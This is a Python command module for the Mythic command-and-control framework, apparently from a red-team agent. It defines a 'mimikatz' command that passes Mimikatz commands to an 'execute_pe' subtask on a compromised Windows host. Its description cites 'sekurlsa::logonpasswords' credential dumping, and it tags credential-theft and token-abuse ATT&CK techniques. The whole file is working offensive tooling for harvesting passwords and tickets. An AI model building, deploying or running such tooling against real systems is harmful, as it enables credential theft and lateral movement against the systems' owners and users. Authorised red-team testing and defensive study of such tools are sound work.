from mythic_payloadtype_container.MythicCommandBase import *
import json
from uuid import uuid4
from sRDI import ShellcodeRDI
from os import path
from mythic_payloadtype_container.MythicRPC import *
import base64


class MimikatzArguments(TaskArguments):

    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="command",
                cli_name="Command",
                display_name="Command(s)", 
                type=ParameterType.String, 
                description="Mimikatz command to run (can be one or more)."),
        ]

    async def parse_arguments(self):
        if len(self.command_line):
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)
            else:
                self.add_arg("command", self.command_line)
            curArg = self.get_arg("command")
            self.add_arg("command", "mimikatz.exe {}".format(curArg))
        else:
            raise Exception("No mimikatz command given to execute.\n\tUsage: {}".format(MimikatzCommand.help_cmd))


class MimikatzCommand(CommandBase):
    cmd = "mimikatz"
    needs_admin = False
    help_cmd = "mimikatz [command1] [command2] [...]"
    description = "Execute one or more mimikatz commands (e.g. `mimikatz coffee sekurlsa::logonpasswords`)."
    version = 2
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_upload_file = False
    is_remove_file = False
    author = "@djhohnstein"
    argument_class = MimikatzArguments
    browser_script = BrowserScript(script_name="unmanaged_injection", author="@djhohnstein")
    attackmapping = ["T1134", "T1098", "T1547", "T1555", "T1003", "T1207", "T1558", "T1552", "T1550"]
    script_only = True

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        response = await MythicRPC().execute("create_subtask", parent_task_id=task.id,
                        command="execute_pe", params_string=task.args.get_arg("command"))
        return task

    async def process_response(self, response: AgentResponse):
        pass
